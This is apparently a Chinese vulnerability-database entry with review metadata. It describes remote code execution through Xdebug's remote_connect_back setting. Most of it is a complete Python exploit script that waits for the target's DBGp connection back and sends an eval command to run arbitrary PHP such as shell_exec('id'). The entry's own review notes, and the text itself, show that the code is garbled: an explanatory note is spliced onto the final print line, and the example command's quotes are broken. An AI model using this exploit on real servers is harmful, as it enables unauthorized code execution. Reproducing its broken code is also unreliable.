---
source: "hatch 补库批 20260928"
product: "Xdebug/DBGp"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Php XDebug 远程调试漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：旧remote_*配置，影响节空白"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-a5c0fb772004f75c77a5a36e"
entity_id: "ve-a5c0fb772004f75c77a5a36e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：旧remote_*配置，影响节空白

代码与实验材料：全文Python脚本与296相同，最后中文说明粘入代码；同样命令引号和四块解析问题

来源证据范围：只有Vulhub转义链接，第一人称我编写疑转载未留作者

- **结论使用边界（1）**：代码尾部混入自然语言不可直接解析；依据：print May be not string result...后同一行接**重要说明**。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：命令引号错误及实例域名适用范围；依据：-c 'shell_exec('id');'，目标www.0-sec.org。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Php XDebug 远程调试漏洞

一、漏洞简介
------------

XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置`remote_connect_back = 1`：

    xdebug.remote_connect_back = 1
    xdebug.remote_enable = 1

这个配置下，我们访问`http://www.0-sec.org/index.php?XDEBUG_SESSION_START=phpstorm`，目标服务器的XDebug将会连接访问者的IP（或`X-Forwarded-For`头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。

二、漏洞影响
------------

三、复现过程
------------

因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。

我编写了一个漏洞复现脚本，指定目标web地址、待执行的php代码即可：

    # 要求用python3并安装requests库
    python3 exp.py -t http://www.0-sec.org:8080/index.php -c 'shell_exec('id');'
    #!/usr/bin/env python3
    import re
    import sys
    import time
    import requests
    import argparse
    import socket
    import base64
    import binascii
    from concurrent.futures import ThreadPoolExecutor


    pool = ThreadPoolExecutor(1)
    session = requests.session()
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }

    def recv_xml(sock):
        blocks = []
        data = b''
        while True:
            try:
                data = data + sock.recv(1024)
            except socket.error as e:
                break
            if not data:
                break

            while data:
                eop = data.find(b'\x00')
                if eop < 0:
                    break
                blocks.append(data[:eop])
                data = data[eop+1:]

            if len(blocks) >= 4:
                break
        
        return blocks[3]


    def trigger(url):
        time.sleep(2)
        try:
            session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
        except:
            pass


    if __name__ == '__main__':
        parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
        parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
        parser.add_argument('-t', '--target', required=True, help='target url.')
        parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
        args = parser.parse_args()
        
        ip_port = ('0.0.0.0', args.listen)
        sk = socket.socket()
        sk.settimeout(10)
        sk.bind(ip_port)
        sk.listen(5)

        pool.submit(trigger, args.target)
        conn, addr = sk.accept()
        conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))

        data = recv_xml(conn)
        print('[+] Recieve data: ' + data.decode())
        g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
        if not g:
            print('[-] No result...')
            sys.exit(0)

        data = g.group(1)

        try:
            print('[+] Result: ' + base64.b64decode(data).decode())
        except binascii.Error:
            print('[-] May be not string result...')**重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。**

参考链接
--------

> https://vulhub.org/\#/environments/php/xdebug-rce/
